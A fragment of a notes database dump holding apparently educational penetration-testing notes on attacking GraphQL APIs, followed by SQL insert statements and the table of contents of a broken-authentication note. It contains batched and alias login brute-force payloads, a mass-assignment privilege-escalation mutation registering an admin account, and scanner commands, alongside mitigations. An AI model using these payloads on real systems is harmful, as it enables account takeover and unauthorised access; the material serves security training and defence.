To picture the batched brute-force body, it is simply the single-login JSON array scaled up — each element tries a different password against the same account:

```http
POST /graphql HTTP/1.1
Host: TARGET
Content-Type: application/json

[
  {"query":"mutation { login(username: \"admin\", password: \"password1\") { token } }"},
  {"query":"mutation { login(username: \"admin\", password: \"password2\") { token } }"},
  {"query":"mutation { login(username: \"admin\", password: \"password3\") { token } }"}
]
```

In practice we would generate thousands of these elements programmatically (a short script reading a password list and emitting the JSON array), send the whole array in one request, and then scan the response array for the one element that returned a `token` instead of an error. Because the server counts this as a single HTTP request, a per-request rate limiter sees one hit while we test the entire wordlist chunk. This is also why a defender who only watches request counts will see nothing unusual — the giveaway is the request *body size* and the number of operations inside it, which is exactly what a batching limit (Section 8) measures instead.

#### A Note on Aliases as a Batching Alternative

Even where array-based batching is disabled, the same brute-force amplification can sometimes be achieved with **aliases** inside a single query, because aliases let us call the same mutation many times in one operation:

```graphql
mutation {
  a1: login(username: "admin", password: "password1") { token }
  a2: login(username: "admin", password: "password2") { token }
  a3: login(username: "admin", password: "password3") { token }
}
```

Each `aN:` is an alias that lets the otherwise-duplicate `login` field coexist in one selection set, and each carries a different password. This is why disabling array batching alone is not a complete fix — a thorough defense also limits operations/aliases per request and rate-limits by **attempts**, not requests. Recognizing that aliases and batching are two routes to the same abuse helps us test both rather than declaring victory after the first is blocked.

---

## Section 6: Mutations

Earlier sections only **read** data. Like REST APIs, GraphQL also provides a way to **modify** data: mutations.

Everything up to this point has been read-only reconnaissance and data theft. Mutations change that: they let us **write** to the backend — create, update, or delete objects. This raises the stakes considerably, because a writable operation without proper authorization does not just leak data, it lets us alter the application''s state: create accounts, change other users'' records, escalate our own privileges, or delete data. The workflow mirrors the query side — enumerate what mutations exist, enumerate their inputs, then test whether we can abuse them — but the impact is higher because we are now modifying rather than merely reading.

### What Are Mutations?

Mutations are GraphQL queries that modify server data. They can **create** new objects, **update** existing objects, or **delete** existing objects. Finding and testing mutations is how we move from reading data to changing the application''s state.

Syntactically a mutation looks almost identical to a query, except it begins with the `mutation` keyword and typically takes an `input` object carrying the data to write. Conceptually, mutations are GraphQL''s equivalent of REST''s `POST`/`PUT`/`PATCH`/`DELETE` verbs — but all delivered through the same single endpoint and the same request format. Because they write data, the two questions we always ask of a mutation are: "what inputs does it accept?" (to look for fields we should not be allowed to set, like `role`) and "does the backend authorize the write?" (to see whether we can act on objects that are not ours). Those two questions drive the rest of this section.

#### Enumerating Mutations

We start by identifying all mutations supported by the backend and their arguments, using this introspection query:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

This is the mutation-side mirror of the query enumeration from Section 2: instead of `queryType` we ask `__schema` for `mutationType`, and for each mutation field we pull its `name` and its `args` (argument name, default value, and type). The same `TypeRef` fragment is reused to fully resolve each argument''s type through its layers of `ofType` wrapping — so we learn not just that an argument is called `input`, but that it is of type `RegisterUserInput`. Knowing the exact input type name is essential, because the next step is to introspect *that* type to see every field we are allowed to send.

From the result we identify a mutation `registerUser`, presumably for creating new users. It requires a `RegisterUserInput` object as input. A mutation named `registerUser` is an obvious high-value target: user registration is a write operation that, if it lets us set the wrong fields, can create privileged accounts. The fact that it takes a structured `RegisterUserInput` object (rather than loose arguments) tells us the interesting fields are hidden *inside* that input type — so we introspect the input type next to see exactly what we can control.

#### Enumerating Input Fields

We query all fields of the `RegisterUserInput` object to learn what we can supply in the mutation:

```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

Note the use of `inputFields` rather than `fields`. Input types (the objects we *send into* a mutation) expose their members through `inputFields`, whereas output types (the objects we *get back*) expose them through `fields` — a distinction the GraphQL spec draws and introspection honors. We ask for each input field''s `name`, `description`, and `defaultValue` so we can see the complete list of values the mutation will accept from us, including any that the frontend form never shows. Those hidden-but-accepted fields are exactly where privilege-escalation bugs hide.

The result shows we can provide the new user''s `username`, `password`, `role`, and `msg`. Spotting that we can set `role` directly is the key — that is what enables the privilege-escalation attack below. This is a textbook **mass assignment** setup: the registration form in the UI almost certainly lets a user set only `username` and `password`, but the underlying mutation *also* accepts `role`. The frontend hides `role`, yet the backend still honors it if we send it directly. Any time enumeration reveals an input field that a normal user should not control — `role`, `isAdmin`, `verified`, `balance`, `uid` — it is worth testing whether the backend blindly trusts it. Here, `role` is that field.

#### Registering a New User

As identified earlier, the password must be provided as an **MD5 hash**. We hash our chosen password:

```shellsession
echo -n ''password'' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -
```

Command explained:
- `echo -n ''password''` prints the password text with **no trailing newline** (`-n`); a newline would change the hash.
- `| md5sum` pipes it into `md5sum`, which outputs the MD5 hash we need.

The `-n` flag is not a minor detail — it is the difference between a working and a non-working hash. By default `echo` appends a newline character, so without `-n` we would be hashing `password\n` (nine bytes) instead of `password` (eight bytes), producing a completely different MD5 digest that the backend would not recognize. This is the same `echo -n | md5sum` pattern seen in the Web Attacks IDOR module, and the same caution applies: whenever you hash a value for an exploit, make sure you are hashing *exactly* the bytes the application expects, with no stray newline. The trailing ` -` in the output is just `md5sum` noting the input came from standard input, not part of the hash.

With the hashed password, we register a new user via the mutation:

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

Two things about the mutation''s shape are worth noting. First, the `input: { ... }` object carries exactly the fields we enumerated — including `role`, which we set to the normal `"user"` here as a baseline before attempting escalation. Second, the block after the input, `{ user { username password msg role } }`, is the mutation''s **selection set**: just like a query, a mutation returns data, and we choose which fields to read back. We deliberately ask for `role` in the response so we can confirm what the server actually stored — a crucial verification step for the escalation attack that follows.

The response echoes the fields we queried in the mutation''s body, so we can confirm there were no errors. We can now log in to the application with the newly registered user. Being able to create a working account *and* read back exactly what the server saved gives us a reliable feedback loop: we change an input field, we read the response, and we see whether the server accepted our value. That loop is what we use next to test whether setting `role: "admin"` actually sticks.

### Exploitation with Mutations (Privilege Escalation)

To find attack vectors through mutations, we examine every supported mutation and its inputs. Here, we can supply the `role` argument for new users, which might let us create a user with a **higher role than the default**, escalating privileges.

The hypothesis is simple and testable: the mutation *accepts* a `role` field, so what happens if we set it to something privileged? A secure backend would ignore a client-supplied `role`, force it to a safe default (`user`), or reject unknown/privileged values. A vulnerable backend stores whatever we send. We already have the feedback loop from the previous step (read `role` back in the response), so confirming the result takes a single request. First, though, we need to know a **valid** privileged role name, because sending an invalid one is rejected.

By querying all existing users we identified two roles: `user` and `admin`. We create a new user with `role: "admin"` and check whether this grants access to the internal `/admin` endpoint:

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

Discovering the valid role name (`admin`) first is what makes this work — guessing role names blindly often yields an "invalid role" rejection, the same obstacle we hit in the Web Attacks IDOR module before we learned the real role name (`web_admin`) by enumerating users. Here we learned the legitimate names by reading them off existing user records, then reused one in our registration. This cross-referencing — leak a valid value in one place, reuse it in another — is a recurring theme across these modules and is often the difference between a blocked attempt and a successful one.

The result reflects `role: "admin"`, indicating success — the backend let us set a privileged role at registration (**mass-assignment-style** flaw). After logging in as this new user, we can access the `/admin` endpoint ("This is the admin area!"), confirming we successfully escalated privileges. The root cause is that the mutation trusts a client-supplied `role` with no server-side authorization check. The final proof is not just that the response echoes `role: "admin"` but that logging in and reaching `/admin` actually works — demonstrating real, usable privilege escalation rather than a cosmetic value in a response. The fix is server-side: the registration resolver should never accept a client-provided `role`, and privileged roles should only ever be granted through a separate, authorized administrative process. This single missing check converts a public registration form into a full administrator-account factory.

#### The Full Mutation Attack Chain (Worked Flow)

Pulling Section 6 together into the order we would actually execute it clarifies how the individual queries chain into a complete compromise:

1. **Enumerate mutations** (`__schema { mutationType { fields { name args ... } } }`) → discover `registerUser` taking a `RegisterUserInput`.
2. **Enumerate the input type** (`__type(name: "RegisterUserInput") { inputFields { name } }`) → discover it accepts `role`, a field the UI never exposes.
3. **Learn valid role names** by reading existing users (via the IDOR/query from earlier) → find `user` and `admin`.
4. **Hash the password** with `echo -n ''password'' | md5sum` → get the MD5 the backend expects.
5. **Register with `role: "admin"`** → the response echoes `admin`, confirming the server stored it.
6. **Log in** as the new account and **browse to `/admin`** → confirm real, usable access.

Each step feeds the next: enumeration finds the dangerous field, cross-referencing supplies the valid value, and the mutation plus a login turns that value into administrative control. This is the same "leak a value here, reuse it there" pattern that threads through the IDOR and SQLi sections — the recurring shape of practical web exploitation.

#### Other Mutations Worth Testing

`registerUser` was the obvious target, but a thorough test probes **every** mutation the enumeration revealed, asking the same two questions of each: *what inputs does it accept that I should not control*, and *does it authorize the write*. Common high-value mutation patterns include:

- **`updateUser` / `editProfile`** — can we change *another* user''s record by supplying their id/uuid (the IDOR-on-write we saw in the Web Attacks module)? Can we set our own `role` while we are at it?
- **`resetPassword` / `changePassword`** — can we trigger it for an account that is not ours, or without the current password?
- **`deleteUser` / `deletePost`** — can we delete objects we do not own, proving a destructive authorization gap?
- **`createCoupon` / `applyCredit`** — any mutation touching money or entitlements is worth testing for missing authorization.

The method never changes: enumerate the mutation''s inputs, send values a normal user should not be allowed to set, and verify the effect server-side. Mutations are where read-only recon turns into real-world impact, so they deserve the most careful testing.

---

## Section 7: Tools of the Trade

Beyond the enumeration tools already covered — **graphw00f** (engine fingerprinting) and **graphql-voyager** (schema visualization) — these tools help us attack GraphQL APIs more efficiently.

It is worth placing these tools in the overall workflow rather than treating them as a disconnected list. **graphw00f** answers "what engine is this?" at the start. **graphql-voyager** answers "what does the schema look like?" during enumeration. **GraphQL-Cop** (below) answers "what misconfigurations exist?" as an automated first pass. And **InQL** (below) makes all of this smoother from inside Burp Suite, where the rest of our web testing already lives. Automated tools are excellent for breadth — they quickly flag the obvious issues — but they do not replace the manual, context-aware testing of the earlier sections; they point us at the areas worth that manual effort.

### GraphQL-Cop

**GraphQL-Cop** is a security audit tool for GraphQL APIs. After cloning the GitHub repo and installing dependencies, we run the `graphql-cop.py` Python script:

```shellsession
python3 graphql-cop.py -v

version: 1.13
```

- `-v` prints the tool''s **version** (a quick check that it runs).

Running `-v` first is a small but good habit: it confirms the script and its Python dependencies installed correctly before we point it at a live target, so if something is broken we find out immediately rather than mid-scan. GraphQL-Cop focuses on **configuration** weaknesses — the kind of broad, policy-level issues (is introspection on? is batching allowed? are there depth limits?) that are tedious to check by hand but easy to automate. It does not deeply exploit anything; it flags what is worth exploiting.

We specify the target GraphQL URL with `-t`. GraphQL-Cop runs multiple basic security-configuration checks and lists all identified issues — an excellent baseline for further manual testing:

```shellsession
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql

[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
[HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)
[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)
[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
[LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
[HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
```

- `-t http://172.17.0.2/graphql` is the **target** endpoint.
- Each result is tagged by severity (`HIGH`/`MEDIUM`/`LOW`) and names both the weakness and its impact category (DoS, Information Leakage, CSRF) — a ready-made checklist to verify manually.

Reading this report ties the whole module together, because almost every line maps to a technique we have covered or a defense we will cover. The four `HIGH` findings (**Alias Overloading**, **Array-based Query Batching**, **Directive Overloading**, **Field Duplication**) are all DoS amplifiers — different ways of making one request do a huge amount of work, closely related to the nested-loop DoS and the batching abuse in Section 5. **Field Suggestions** and **Introspection** under Information Leakage confirm the enumeration advantages from Section 2. **GraphiQL Explorer enabled** is the in-browser IDE we used. The two `MEDIUM` CSRF findings (**GET method query support** and **non-JSON POST queries**) point to a different risk class: if state-changing operations can be triggered by a simple GET or form-encoded POST, an attacker can forge them from another site. GraphQL-Cop''s value is turning the whole attack surface into this concise, prioritized checklist in seconds — but each line still needs manual confirmation and impact assessment before it goes in a report.

### InQL

**InQL** is a Burp extension installed via the **BApp Store** in Burp. After installation, an `InQL` tab is added to Burp. The extension also adds `GraphQL` tabs in the Proxy History and Burp Repeater, which let us edit GraphQL queries easily without wrestling with the surrounding JSON syntax.

The practical appeal of InQL is that it brings GraphQL testing into the tool we already use for the rest of a web assessment, so we are not constantly switching between GraphiQL, a terminal, and Burp. The dedicated `GraphQL` tabs in Proxy History and Repeater solve the recurring JSON-escaping headache: instead of hand-escaping every quote inside a `{"query":"..."}` body, InQL gives us a clean editor that handles the wrapping for us. That makes iterating on a payload — tweak an argument, resend, observe — much faster, which is exactly what injection and IDOR testing require.

To use it, right-click a GraphQL request and select **Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner**. InQL then generates introspection information, and all mutations and queries for the scanned host appear in the `InQL` tab. This is only a basic overview — see the official GitHub repository for more. In effect, InQL automates the introspection-and-enumeration phase from Section 2 and presents the results as ready-to-send queries and mutations, so we can jump straight to sending and modifying them in Repeater. It is the "glue" tool that connects automated discovery to manual, Burp-driven exploitation — which is why it is worth installing early in any GraphQL engagement.

#### Choosing the Right Tool for Each Phase

Because the four tools overlap a little, a quick guide to when each earns its place:

- **graphw00f** — run **first**, once, to identify the engine and locate the endpoint. Its output shapes every later decision.
- **GraphQL-Cop** — run **early**, as an automated sweep for configuration weaknesses (introspection, batching, depth, CSRF). Treat its findings as a prioritized to-do list, not a final report.
- **graphql-voyager** — run **during enumeration**, to turn the raw introspection dump into a readable map where loops and sensitive fields stand out. Host it locally for real targets.
- **InQL** — run **throughout exploitation**, inside Burp, to enumerate and then hand-edit queries and mutations without fighting JSON escaping.

No single tool does everything, and none replaces the manual testing in Sections 3–6 — their job is to accelerate discovery so our limited time goes to the context-dependent work (crafting injection payloads, confirming IDOR impact, chaining a mutation into real privilege escalation) that automation cannot judge for us.

---

## Section 8: GraphQL Vulnerability Prevention

After covering how to attack vulnerabilities from misconfigured GraphQL implementations, here are the mitigations that prevent them.

A theme runs through all of these defenses: GraphQL''s flexibility is the feature *and* the risk, so prevention is largely about putting sensible **limits** and **checks** back on that flexibility. Disable what you do not need (introspection, the IDE, batching), validate everything the client sends (inputs, query depth, query cost), and never trust the client for anything security-relevant (roles, ownership, authorization). None of these are exotic — they are the same defense-in-depth principles used across web security — but GraphQL''s single-endpoint, client-shaped-query model means they must be applied deliberately rather than relied upon by default.

One framing that helps developers prioritize: sort the defenses by *what they protect*. Controls that **reduce information** (disable introspection, field suggestions, verbose errors, the IDE) raise the attacker''s cost of reconnaissance. Controls that **validate input** (parameterized queries, allowlist validation, output encoding) stop injection. Controls that **cap work** (depth limits, cost analysis, batch/alias limits, rate limits) stop DoS and brute force. And controls that **enforce identity** (per-object and per-operation authorization, least privilege) stop IDOR and privilege escalation — the highest-impact issues. A team that implements at least one control from each of those four groups has defense in depth; a team that relies on only one group (say, "we turned off introspection") has a single brittle layer that the fallback techniques in Section 2 and the resolver-level bugs in Sections 3 and 6 walk straight past.

### Information Disclosure

General security best practices apply. Prevent **verbose error messages** and show generic errors instead. Introspection queries are powerful information-gathering tools, so **disable introspection** where possible. At the very least, check whether introspection discloses any sensitive information and remove it if so. Reducing what the schema reveals directly shrinks the attacker''s map.

Concretely, this section maps straight back to Section 2''s attacks. Disabling **introspection** removes the one-query schema dump; disabling **field suggestions** stops the server from helpfully correcting our misspelled field names; and turning off **verbose errors** denies us the SQL-statement leaks and argument-name hints we relied on. Turning off the **GraphiQL/Playground IDE** in production removes the guided tour. None of these fully stop a determined tester (error-driven enumeration and traffic analysis still reveal some structure), but together they turn effortless reconnaissance back into slow, uncertain guesswork — which is exactly the point of defense in depth.

A realistic caveat for defenders: disabling introspection is valuable but is sometimes treated as a complete fix when it is not. As Section 2''s fallback subsection showed, field suggestions and error-driven discovery can rebuild much of the schema even with introspection off, and automated tools like Clairvoyance specialise in exactly that. So "introspection disabled" should be one line in a layered defense, accompanied by disabling field suggestions, returning generic errors, and — most importantly — the input-validation and authorization controls in the following subsections, which stop the *exploitation* even where *reconnaissance* partially succeeds. Security that depends on the attacker not finding the schema is weaker than security that remains sound even when they do.

### Injection Attacks

Implement proper **input validation** to prevent injection attacks such as SQL injection, command injection, and XSS. Treat all user-supplied data as untrusted until it has been properly sanitized. Prefer **allowlists** over denylists, since allowlists define exactly what is permitted rather than trying to block every bad input.

The single most effective defense against the SQL injection in Section 4 is not mentioned by name here but is the industry standard: **parameterized queries** (prepared statements), which separate SQL code from data so an injected quote can never change the query''s structure. Input validation and allowlisting are valuable additional layers — an allowlist that permits only expected characters in a `username` stops many payloads at the door — but they are a complement to parameterization, not a replacement for it. For the XSS vector, the matching defense is **context-aware output encoding**: encode values for the exact context (HTML, attribute, JavaScript) wherever they are rendered, including inside error messages, so a reflected `<script>` is shown as text rather than executed.

### Denial-of-Service (DoS)

As shown, DoS attacks and batching-amplified brute-force are common GraphQL vectors. Implement proper **limits**: cap **query depth** and **maximum query size**, and apply **rate limits** on the GraphQL endpoint to stop rapid repeated queries. Additionally, **disable batching** whenever possible; if batching is required, limit the query depth.

Each limit here neutralizes a specific Section 5 attack. A **query-depth limit** directly kills the nested `posts → author → posts` loop by rejecting any query past a fixed nesting level, so the exponential blow-up can never be reached. **Query cost analysis** goes further by assigning a "cost" to each field and rejecting queries whose total cost exceeds a budget, catching expensive-but-shallow queries too. **Batching limits** (a maximum number of operations per request) defeat the rate-limit-bypass brute force, and rate-limiting by **attempts rather than requests** removes the mismatch that batching exploited. Applying several of these together gives layered protection: even if one limit is set too loosely, another catches the abuse.

### API Design

Follow general API security best practices to prevent further attacks such as improper access control (e.g. IDOR) and improper authorization on mutations. Apply strict access control based on the **principle of least privilege**. Where the use case allows, the GraphQL endpoint should only be accessible after successful **authentication**, and **authorization checks** must prevent actors from running queries or mutations they are not permitted to. (See OWASP''s GraphQL Cheat Sheet for more detail.)

This final category addresses the highest-impact findings in the module — the IDOR in Section 3 and the mutation-based privilege escalation in Section 6 — and the fix for both is the same principle: **enforce authorization on the server, per object and per operation, never trusting the client**. For IDOR, that means every resolver must check that the logged-in session is actually allowed to read the specific record requested, not merely that *someone* is logged in. For the `registerUser` escalation, it means the resolver must never accept a client-supplied `role`; privileged roles should be assignable only through a separate, authenticated admin workflow. Object-level access control (as discussed in the Web Attacks IDOR Prevention section, ideally via an RBAC system mapped to every object) is the systematic way to guarantee these checks happen everywhere rather than being remembered field by field.

---

## Section 9: Quick Reference & Glossary

This closing section condenses the module into fast look-ups: the conceptual differences from REST, the vocabulary, a per-attack cheat sheet, the commands used, and a methodology checklist. It repeats information from earlier sections on purpose, so it can be used on its own during an engagement without re-reading the whole document.

### 9.1 GraphQL vs REST (Key Differences)

Understanding these contrasts explains *why* the attack surface differs from a normal REST API and where to focus.

| Aspect | REST | GraphQL |
| --- | --- | --- |
| Endpoints | Many URLs, one per resource | Usually one endpoint (`/graphql`) for everything |
| Who chooses fields | The server decides the response shape | The **client** chooses fields in the query |
| Over-fetching | Common (fixed responses) | Client asks for only what it needs |
| Discovery | Guess/brute-force paths, read docs | **Introspection** can dump the whole schema |
| Read vs write | HTTP verbs (GET/POST/PUT/DELETE) | `query` (read) vs `mutation` (write) |
| Primary injection surface | URL params, body fields | Query **arguments** |
| Depth abuse | Limited | Nested/looping queries enable DoS |
| Request bundling | One operation per request (usually) | **Batching**: many operations per request |

The two rows that matter most for testing are "who chooses fields" (why over-exposed fields like `password` are reachable) and "discovery" (why introspection makes recon trivial). Almost every GraphQL-specific advantage an attacker has traces back to one of those two.

### 9.2 Core Terms Glossary

- **Schema** — the full definition of the API: every type, field, query, and mutation. Introspection reveals it.
- **Type** — a data shape (e.g. `UserObject`). Has fields. Custom types map to application data.
- **Field** — a single piece of data on a type (e.g. `username`, `password`). The client selects which fields to return.
- **Scalar** — a primitive field type: `Int`, `Float`, `String`, `Boolean`, `ID`. The `kind` is `SCALAR`.
- **Query** — a read operation. The root entry points live on `queryType`.
- **Mutation** — a write operation (create/update/delete). The root entry points live on `mutationType`.
- **Argument** — input to a query/field, written in parentheses (`user(username: "x")`). The main injection surface.
- **Selection set** — the `{ ... }` list of fields you want back.
- **Introspection** — built-in queries (`__schema`, `__type`) that describe the API itself.
- **Fragment** — a named, reusable selection set referenced with `...Name`; keeps big introspection queries DRY.
- **Connection / edges / node** — the pagination pattern; a `...Connection` type wraps items in `edges { node { ... } }`.
- **Resolver** — backend function that produces a field''s value; where arguments reach SQL/OS/HTML.
- **GraphiQL** — the in-browser GraphQL IDE; its presence signals introspection is on.
- **Batching** — sending multiple operations in one request as a JSON array.

### 9.3 Attack-by-Attack Cheat Sheet

- **Information Disclosure** — fingerprint engine with graphw00f, then run introspection (`__schema`/`__type`), then visualize in Voyager. Look for sensitive fields (`password`, `role`) and loops.
- **IDOR** — change an identifier argument (`user(username: "someone_else")`); if another user''s data returns, authorization is missing. Add sensitive fields (`password`) to maximize impact.
- **SQL Injection** — test string arguments with `''` and `'' --`; read the SQL error; count columns from the object''s scalar fields; build `UNION SELECT` with `GROUP_CONCAT`, placing stolen data in the column matching the field you read back.
- **XSS** — test data reflection and error-message reflection (send a string where an `Int` is expected); confirm it actually executes in an HTML context before claiming it.
- **DoS** — nest a type loop (`posts → author → posts → ...`) deeply; demonstrate rising latency rather than causing a real outage.
- **Batching brute force** — bundle many login queries in one JSON-array request to defeat per-request rate limits.
- **Mutations / privilege escalation** — enumerate mutation inputs; if a field like `role` is accepted, set it to a valid privileged value (learn the valid name by reading existing users).

### 9.4 Command Reference

```shellsession
# Fingerprint the GraphQL engine and find the endpoint
python3 main.py -d -f -t http://TARGET

# Security-configuration audit
python3 graphql-cop/graphql-cop.py -t http://TARGET/graphql

# Hash a password as MD5 for a registerUser mutation (no trailing newline!)
echo -n ''password'' | md5sum

# Clone the OOB/automation tool family referenced across modules
git clone https://github.com/dolevf/graphql-cop.git
```

- `-d -f` on graphw00f = detect endpoint + fingerprint engine in one run.
- `-t` is the target in both tools; graphw00f takes a base URL, GraphQL-Cop takes the full `/graphql` endpoint.
- `echo -n` avoids the trailing newline that would corrupt the MD5 hash.

### 9.5 Engine Defaults Reference (Why Fingerprinting Matters)

Fingerprinting pays off because each engine ships with different defaults, which pre-sort our attack list. This condensed table (drawn from the GraphQL-Threat-Matrix the `graphw00f` output linked to) shows the pattern for a few common engines; always confirm against the live target rather than trusting defaults blindly.

| Concern | Graphene (Python) | Typical Apollo (JS) | What it means for us |
| --- | --- | --- | --- |
| Introspection | On by default | Often on in dev, off in prod | On → free full-schema dump |
| Field suggestions | On by default | Often on | On → leak field names via misspellings |
| Query depth limit | Not supported | Needs a plugin | Missing → nested-loop DoS viable |
| Query cost analysis | Not supported | Needs a plugin | Missing → expensive queries allowed |
| Batching | Off by default | Often on | On → rate-limit-bypass brute force |
| Debug mode / verbose errors | Varies | Varies | On → SQL errors & stack traces leak |

The practical reading: against Graphene we expect introspection and DoS to work and batching to possibly need enabling; against a hardened Apollo prod deployment we may need the error-driven and field-suggestion fallbacks from Section 2 instead. Either way, the fingerprint tells us where to spend our time first.

### 9.6 Testing Methodology Checklist

1. **Locate** the endpoint (`/graphql`, `/api/graphql`, …) and confirm it speaks GraphQL.
2. **Fingerprint** the engine with graphw00f; note its default protections.
3. **Enumerate** via introspection: all types → each type''s fields → all queries → all mutations → full dump → Voyager.
4. **Flag** sensitive fields (`password`, `role`) and type **loops** on the schema map.
5. **IDOR**: change identifier arguments; try reading other users'' records and sensitive fields.
6. **Injection**: test every string argument for SQLi (`''`, `'' --`, UNION); test type-strict args for error-reflected XSS.
7. **DoS/limits**: test query depth (safely) and batching; confirm with GraphQL-Cop''s DoS findings.
8. **Mutations**: enumerate inputs; test mass-assignment fields (`role`) for privilege escalation; verify by actually using the new privilege.
9. **Report** each finding with evidence and the matching Section 8 fix (disable introspection, parameterize queries, encode output, depth/batch limits, server-side authorization).

---

*End of Notes — Attacking GraphQL Module (Sections 1–8, plus Quick Reference)*', NULL, 'PUBLISHED', 'PUBLIC', 81, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792518741.826), to_timestamp(1792518741.826), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvgzgxas006aidhwgd22vs70', 'Broken Authentication', 'broken-authentication', 'Complete notes on broken authentication covering user enumeration via error messages and timing, password brute-forcing with policy-matched wordlists, password spraying and credential stuffing, reset-token and 2FA/TOTP brute-forcing, bypassing rate limits and CAPTCHAs, default credentials, vulnerable password-reset logic (guessable security questions and username manipulation), authentication bypass via direct access and parameter modification, and session token attacks including weak entropy, predictable/encoded tokens, session fixation, and improper timeouts — with concrete mitigations and a payload quick-reference appendix.', '# Broken Authentication — Complete Notes
## Table of Contents

1. [What is Authentication](#1-what-is-authentication)
   - 1.1 [Authentication vs Authorization](#11-authentication-vs-authorization)
   - 1.2 [Common Authentication Methods](#12-common-authentication-methods)
   - 1.3 [Single-Factor vs Multi-Factor Authentication](#13-single-factor-vs-multi-factor-authentication)
2. [Attacks on Authentication](#2-attacks-on-authentication)
   - 2.1 [Attacking Knowledge-Based Authentication](#21-attacking-knowledge-based-authentication)
   - 2.2 [Attacking Ownership-Based Authentication](#22-attacking-ownership-based-authentication)
   - 2.3 [Attacking Inherence-Based Authentication](#23-attacking-inherence-based-authentication)
3. [Enumerating Users](#3-enumerating-users)
   - 3.1 [User Enumeration Theory](#31-user-enumeration-theory)
   - 3.2 [Enumerating via Differing Error Messages](#32-enumerating-via-differing-error-messages)
   - 3.3 [User Enumeration via Side-Channel Attacks](#33-user-enumeration-via-side-channel-attacks)
4. [Brute-Forcing Passwords](#4-brute-forcing-passwords)
   - 4.1 [Why Password Brute-Forcing Works](#41-why-password-brute-forcing-works)
   - 4.2 [Building a Policy-Matched Wordlist](#42-building-a-policy-matched-wordlist)
   - 4.3 [Brute-Forcing the Login](#43-brute-forcing-the-login)
5. [Brute-Forcing Password Reset Tokens](#5-brute-forcing-password-reset-tokens)
   - 5.1 [Identifying Weak Reset Tokens](#51-identifying-weak-reset-tokens)
   - 5.2 [Attacking Weak Reset Tokens](#52-attacking-weak-reset-tokens)
6. [Brute-Forcing 2FA Codes](#6-brute-forcing-2fa-codes)
   - 6.1 [How 2FA Works](#61-how-2fa-works)
   - 6.2 [Attacking TOTP Codes](#62-attacking-totp-codes)
7. [Weak Brute-Force Protection](#7-weak-brute-force-protection)
   - 7.1 [Rate Limits](#71-rate-limits)
   - 7.2 [CAPTCHAs](#72-captchas)
8. [Default Credentials](#8-default-credentials)
   - 8.1 [Why Default Credentials Matter](#81-why-default-credentials-matter)
   - 8.2 [Testing Default Credentials](#82-testing-default-credentials)
9. [Vulnerable Password Reset](#9-vulnerable-password-reset)
   - 9.1 [Guessable Password Reset Questions](#91-guessable-password-reset-questions)
   - 9.2 [Manipulating the Reset Request](#92-manipulating-the-reset-request)
10. [Authentication Bypass via Direct Access](#10-authentication-bypass-via-direct-access)
    - 10.1 [Direct Access to Protected Resources](#101-direct-access-to-protected-resources)
    - 10.2 [Forcing the Response with Burp](#102-forcing-the-response-with-burp)
11. [Authentication Bypass via Parameter Modification](#11-authentication-bypass-via-parameter-modification)
    - 11.1 [Parameter Modification](#111-parameter-modification)
    - 11.2 [Escalating via User IDs](#112-escalating-via-user-ids)
12. [Attacking Session Tokens](#12-attacking-session-tokens)
    - 12.1 [Brute-Forcing Weak Session Tokens](#121-brute-forcing-weak-session-tokens)
    - 12.2 [Predictable & Tamperable Session Tokens](#122-predictable--tamperable-session-tokens)
13. [Further Session Attacks](#13-further-session-attacks)
    - 13.1 [Session Fixation](#131-session-fixation)
    - 13.2 [Improper Session Timeout](#132-improper-session-timeout)
14. [Module Summary & Methodology](#14-module-summary--methodology)
15. [Appendix — Quick Reference](#15-appendix--quick-reference)
    - 15.1 [ffuf Command Patterns for Auth Attacks](#151-ffuf-command-patterns-for-auth-attacks)
    - 15.2 [ffuf Filter / Matcher Reference](#152-ffuf-filter--matcher-reference)
    - 15.3 [Wordlist & Token Generation](#153-wordlist--token-generation)
    - 15.4 [Encoding / Decoding One-Liners](#154-encoding--decoding-one-liners-session--reset-tokens)
    - 15.5 [Client IP Headers for Rate-Limit Bypass](#155-client-ip-headers-to-try-for-rate-limit-bypass)
    - 15.6 [Defender Checklist](#156-defender-checklist-map-each-finding-to-a-fix)
    - 15.7 [Practical Tips & Common Mistakes](#157-practical-tips--common-mistakes)
